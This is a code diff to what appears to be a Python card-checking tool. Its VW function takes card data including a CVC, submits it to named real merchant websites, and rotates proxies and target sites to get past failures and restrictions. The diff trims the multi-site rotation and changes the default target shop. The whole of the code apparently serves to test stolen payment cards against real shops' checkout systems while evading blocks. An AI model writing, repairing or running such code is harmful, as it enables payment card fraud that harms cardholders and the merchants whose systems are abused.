@@ -7,12 +7,6 @@ import datetime
 import uuid
 import json
 
-DEFAULT_ST2_SITES = [
-    "dilaboards.com",
-    "shop.mydario.com",
-    "oliveadot.com",
-]
-
 
 def check_status(response_text):
     resp = str(response_text).lower()
@@ -45,37 +39,16 @@ def extract_value(text, patterns):
 
 
 async def VW(ccx, url=None, proxy_url=None, proxy_list=None, max_retries=3):
-    sites_to_try = [url] if url else DEFAULT_ST2_SITES.copy()
-    random.shuffle(sites_to_try)
-
-    last_res = "unknown"
-
-    # Try with proxy first (or direct if None), then fallback to direct if proxy fails
-    px = proxy_url
-    proxy_attempts = [px, None] if px else [None]
-
-    for current_px in proxy_attempts:
-        for target_url in sites_to_try:
-            for attempt in range(max_retries):
-                if proxy_list and attempt > 0 and current_px:
-                    current_px = random.choice(proxy_list)
-                
-                result = await _VW_once(ccx, target_url, current_px)
-                rl = str(result).lower()
-
-                # If connection error, retry
-                if "connectionpool" in rl or "proxyerror" in rl or "connect timeout" in rl or "connection error" in rl or "errno 104" in rl or "reset" in rl:
-                    last_res = result
-                    continue
-
-                # If merchant key is restricted or nonce missing, rotate target domain
-                if "unsupported for publishable key" in rl or "nonce not found" in rl or "pk not found" in rl or "pm creation failed" in rl or result == "unknown":
-                    last_res = result
-                    break
-
-                return result
-
-    return last_res if last_res else "unknown"
+    for attempt in range(max_retries):
+        px = proxy_url
+        if proxy_list and attempt > 0:
+            px = random.choice(proxy_list)
+        result = await _VW_once(ccx, url, px)
+        rl = str(result).lower()
+        if "connectionpool" in rl or "proxyerror" in rl or "connect timeout" in rl or "connection error" in rl or "nonce not found" in rl or "pk not found" in rl:
+            continue
+        return result
+    return result
 
 
 async def _VW_once(ccx, url=None, proxy_url=None):
@@ -91,7 +64,7 @@ async def _VW_once(ccx, url=None, proxy_url=None):
     cvc = parts[3]
 
     if not url:
-        url = "dilaboards.com"
+        url = "motherluckranch.com"
 
     URL = url.replace("https://", "").replace("http://", "").strip("/")
 
